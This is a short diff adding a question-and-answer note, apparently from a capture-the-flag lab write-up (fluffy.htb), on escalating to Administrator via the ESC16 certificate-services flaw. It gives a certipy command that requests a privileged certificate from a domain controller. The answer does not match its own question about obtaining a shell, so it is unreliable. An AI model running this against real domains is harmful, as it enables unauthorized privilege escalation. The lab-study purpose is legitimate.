@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you obtain a shell as an Administrator after exploiting ESC16?
+
+CONTEXT:
+You have successfully created a certificate with elevated privileges.
+
+METHOD / ANSWER:
+Command: `certipy req -u <account> -p <password> --template User -dc-ip 10.10.11.60 -target dc01.fluffy.htb`
+Explanation: This requests a certificate exploiting ESC16, effectively allowing for the elevation of privileges.
